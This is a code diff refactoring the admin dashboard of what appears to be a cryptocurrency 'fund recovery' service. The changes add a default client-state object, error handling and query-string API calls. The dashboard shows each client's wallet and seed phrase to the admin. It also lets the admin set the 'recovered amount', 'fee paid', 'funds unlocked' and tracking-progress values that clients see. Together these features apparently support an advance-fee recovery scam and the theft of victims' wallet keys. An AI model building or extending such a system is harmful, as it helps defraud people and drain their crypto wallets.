@@ -40,7 +40,26 @@ interface Message {
   clientEmail: string;
   adminReply?: string;
   adminReplyTime?: string;
+  content?: string;
+  timestamp?: string;
+  createdAt?: string;
 }
+
+const defaultClientData: ClientData = {
+  recoveredAmount: 0,
+  trackingProgress: 0,
+  totalPercentage: 0,
+  feePaid: false,
+  paymentPending: false,
+  paymentConfirmed: false,
+  fundsUnlocked: false,
+  balance: 0,
+  fixed: 0,
+  marsettaShare: 0,
+  verifiedLoss1: 0,
+  verifiedLoss2: 0,
+  totalEntitlement: 0,
+};
 
 export default function AdminDashboard() {
   const router = useRouter();
@@ -49,21 +68,7 @@ export default function AdminDashboard() {
   const [clients, setClients] = useState<Client[]>([]);
   const [selectedClient, setSelectedClient] = useState<string | null>(null);
   const [clientData, setClientData] = useState<any>(null);
-  const [data, setData] = useState<ClientData>({
-    recoveredAmount: 0,
-    trackingProgress: 0,
-    totalPercentage: 0,
-    feePaid: false,
-    paymentPending: false,
-    paymentConfirmed: false,
-    fundsUnlocked: false,
-    balance: 0,
-    fixed: 0,
-    marsettaShare: 0,
-    verifiedLoss1: 0,
-    verifiedLoss2: 0,
-    totalEntitlement: 0,
-  });
+  const [data, setData] = useState<ClientData>(defaultClientData);
   const [messages, setMessages] = useState<Message[]>([]);
   const [clientWallet, setClientWallet] = useState('');
   const [clientSeed, setClientSeed] = useState('');
@@ -84,17 +89,22 @@ export default function AdminDashboard() {
       return;
     }
 
-    const parsedUser = JSON.parse(storedUser);
-    if (parsedUser.role !== 'admin') {
+    try {
+      const parsedUser = JSON.parse(storedUser);
+      if (parsedUser.role !== 'admin') {
+        router.push('/admin-login');
+        return;
+      }
+
+      setToken(storedToken);
+      setUser(parsedUser);
+
+      // Load clients
+      fetchClients(storedToken);
+    } catch (error) {
+      console.error('Error parsing user data:', error);
       router.push('/admin-login');
-      return;
     }
-
-    setToken(storedToken);
-    setUser(parsedUser);
-
-    // Load clients
-    fetchClients(storedToken);
   }, []);
 
   // Animate progress bar with phases
@@ -169,7 +179,7 @@ export default function AdminDashboard() {
 
   const fetchClientData = async (clientId: string, authToken: string) => {
     try {
-      const response = await fetch(getApiUrl(`/api/admin/client/${clientId}`), {
+      const response = await fetch(getApiUrl(`/api/admin/client?id=${clientId}`), {
         headers: {
           'Authorization': `Bearer ${authToken}`,
         },
@@ -178,7 +188,10 @@ export default function AdminDashboard() {
       if (response.ok) {
         const data = await response.json();
         setClientData(data);
-        setData(data.data);
+        setData({
+          ...defaultClientData,
+          ...(data.data ?? {}),
+        });
         setClientWallet(data.wallet || '');
         setClientSeed(data.seedPhrase || '');
         fetchMessages(authToken, data.email);
@@ -230,20 +243,22 @@ export default function AdminDashboard() {
     }
 
     try {
-      const response = await fetch(getApiUrl(`/api/admin/client/${selectedClient}`), {
+      const response = await fetch(getApiUrl(`/api/admin/client?id=${selectedClient}`), {
         method: 'PUT',
         headers: {
           'Content-Type': 'application/json',
           'Authorization': `Bearer ${token}`,
         },
-        body: JSON.stringify(data),
+        body: JSON.stringify({ data }),
       });
 
       if (response.ok) {
         alert('Client data updated successfully.');
         fetchClientData(selectedClient, token);
       } else {
-        alert('Error updating client data.');
+        const errorText = await response.text();
+        console.error('Update failed:', errorText);
+        alert(`Error updating client data: ${errorText}`);
       }
     } catch (error) {
       console.error('Error:', error);
@@ -261,7 +276,7 @@ export default function AdminDashboard() {
     }
 
     try {
-      const response = await fetch(getApiUrl(`/api/admin/client/${selectedClient}`), {
+      const response = await fetch(getApiUrl(`/api/admin/client?id=${selectedClient}`), {
         method: 'DELETE',
         headers: {
           'Authorization': `Bearer ${token}`,
@@ -271,21 +286,7 @@ export default function AdminDashboard() {
       if (response.ok) {
         setClients(clients.filter(client => client.id !== selectedClient));
         setSelectedClient(null);
-        setData({
-          recoveredAmount: 0,
-          trackingProgress: 0,
-          totalPercentage: 0,
-          feePaid: false,
-          paymentPending: false,
-          paymentConfirmed: false,
-          fundsUnlocked: false,
-          balance: 0,
-          fixed: 0,
-          marsettaShare: 0,
-          verifiedLoss1: 0,
-          verifiedLoss2: 0,
-          totalEntitlement: 0,
-        });
+        setData(defaultClientData);
         setClientWallet('');
         setClientSeed('');
         alert('Client session deleted.');
@@ -331,6 +332,11 @@ export default function AdminDashboard() {
     localStorage.removeItem('token');
     localStorage.removeItem('user');
     router.push('/');
+  };
+
+  const formatMessageTime = (rawTime?: string | Date) => {
+    const date = rawTime ? new Date(rawTime) : null;
+    return date && !isNaN(date.getTime()) ? date.toLocaleTimeString() : '';
   };
 
   const activityFeed = [
@@ -573,7 +579,7 @@ export default function AdminDashboard() {
                   messages.map(msg => (
                     <div key={msg.id} className="rounded-3xl bg-slate-950/80 p-4 border border-white/10">
                       <div className="flex justify-between items-center mb-2">
-                        <span className="text-xs uppercase tracking-[0.3em] text-slate-500">{msg.from} - {new Date(msg.time).toLocaleTimeString()}</span>
+                        <span className="text-xs uppercase tracking-[0.3em] text-slate-500">{msg.from} - {formatMessageTime(msg.time || msg.timestamp || msg.createdAt)}</span>
                         {msg.adminReply ? (
                           <span className="text-green-400 text-xs">Replied</span>
                         ) : (
@@ -585,7 +591,7 @@ export default function AdminDashboard() {
                           </button>
                         )}
                       </div>
-                      <p className="text-sm text-slate-200">{msg.message}</p>
+                      <p className="text-sm text-slate-200">{msg.message || msg.content}</p>
                       {msg.adminReply && (
                         <div className="mt-2 p-3 bg-cyan-500/10 rounded-lg border border-cyan-500/20">
                           <p className="text-xs text-cyan-300">Your reply: {msg.adminReply}</p>
@@ -630,11 +636,11 @@ export default function AdminDashboard() {
             <div className="glass rounded-[32px] border border-white/10 bg-white/5 p-8 shadow-xl shadow-cyan-500/5">
               <p className="text-xs uppercase tracking-[0.3em] text-cyan-300 mb-4">Current Client Status</p>
               <div className="space-y-4 text-sm">
-                <p><strong>Recovered Amount:</strong> ${data.recoveredAmount.toLocaleString()}</p>
-                <p><strong>Fee Paid:</strong> {data.feePaid ? 'Yes' : 'No'}</p>
-                <p><strong>Tracking Progress:</strong> {data.trackingProgress}%</p>
-                <p><strong>Total Percentage:</strong> {data.totalPercentage}%</p>
-                <p><strong>Payment Pending:</strong> {data.paymentPending ? 'Yes' : 'No'}</p>
+                <p><strong>Recovered Amount:</strong> ${data?.recoveredAmount?.toLocaleString?.() ?? '0'}</p>
+                <p><strong>Fee Paid:</strong> {data?.feePaid ? 'Yes' : 'No'}</p>
+                <p><strong>Tracking Progress:</strong> {data?.trackingProgress ?? 0}%</p>
+                <p><strong>Total Percentage:</strong> {data?.totalPercentage ?? 0}%</p>
+                <p><strong>Payment Pending:</strong> {data?.paymentPending ? 'Yes' : 'No'}</p>
               </div>
             </div>
           </aside>
